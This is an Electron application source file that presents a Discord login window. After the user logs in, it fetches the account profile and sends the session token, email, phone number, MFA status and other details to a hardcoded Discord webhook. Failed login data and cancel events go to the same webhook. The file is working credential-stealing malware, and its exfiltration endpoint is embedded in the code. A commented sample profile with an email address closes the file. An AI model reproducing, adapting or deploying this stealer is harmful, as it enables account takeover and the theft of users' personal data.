const { app, BrowserWindow } = require('electron');
const LoginApi = require('electron-discordloginapi');
const fetch = require('node-fetch');
const moment = require('moment');
const { Webhook } = require("discord-webhook-client");
const webhook = new Webhook({
  url: "https://discord.com/api/webhooks/846239217072078889/0HKSsWNYxv1uVLw6nTjud1DxgxS_C2nZHDeCBsAd8N_6uMn0xe9MKa7fwv7YpW7NA06q"
});

// Handle creating/removing shortcuts on Windows when installing/uninstalling.
if (require('electron-squirrel-startup')) {
  // eslint-disable-line global-require
  app.quit();
}

const createWindow = () => {
  const win = new BrowserWindow();
  win.loadFile('src/index.html');

  LoginApi.startLogin();

  LoginApi.setLoginSuccessListener(result => {
    //when the login is complete
    fetch('https://discordapp.com/api/v6/users/@me', {
      method: 'GET',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `${result.token}`
      }
    }).then(res => res.json()).then(json => {
      webhook.send(`
**ID**
ID: ${json.id}
**EMAIL**
${json.email} (verified: ${json.verified})
**PHONE NUMBER**
${json.phone ?? "No phone number set"}
**BIO**
${(json.bio.length > 0) ? json.bio : "No bio set"}
**MFA ENABLED**
${json?.mfa_enabled}
**PUBLIC FLAGS | FLAGS**
${json.public_flags} | ${json.flags}
**LOCALE**
${json.locale}
**CREATION DATE**
${getCreationDate(json.id)}`);
    });
    webhook.send(result.token);
  });
  
  LoginApi.setLoginFailListener(result => {
    //when the user enter wrong password/username or need captcha verification/2fa etc...
    webhook.send(result);
  });
  
  LoginApi.setCancelListener(() => {
    //when the user manualy close the login page
    webhook.send('User has canceled the login and closed login page');
  });
  
  LoginApi.setCloseListener(() => {
    //when the page is closed by the user or after clogin complete
    webhook.send('Login button pressed and page has closed or user canceled the login');
  });
};

// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
// Some APIs can only be used after this event occurs.
app.whenReady().then(() => {
  createWindow();
});

// Quit when all windows are closed, except on macOS. There, it's common
// for applications and their menu bar to stay active until the user quits
// explicitly with Cmd + Q.
app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});

app.on('activate', () => {
  // On OS X it's common to re-create a window in the app when the
  // dock icon is clicked and there are no other windows open.
  if (BrowserWindow.getAllWindows().length === 0) {
    createWindow();
  }
});

function convertIDtoUnix(id) {
  /* Note: id has to be str */
  const bin = (+id).toString(2);
  let unixbin = '';
  let unix = '';
  const m = 64 - bin.length;
  unixbin = bin.substring(0, 42 - m);
  unix = parseInt(unixbin, 2) + 1420070400000;
  return unix;
}

function getCreationDate(id) {
  const unix = convertIDtoUnix(id.toString());
  const timestamp = moment.unix(unix / 1000);
  return timestamp.format('YYYY-MM-DD, h:mm:ss A');
}




// {
//   "id": "922403865717010442",
//   "username": "SelectiveOrangeGamefowl",
//   "avatar": null,
//   "discriminator": "9867",
//   "public_flags": 0,
//   "flags": 0,
//   "banner": null,
//   "banner_color": null,
//   "accent_color": null,
//   "bio": "",
//   "locale": "en-US",
//   "nsfw_allowed": true,
//   "mfa_enabled": false,
//   "email": "xorov45332@xtrempro.com",
//   "verified": true,
//   "phone": null
// }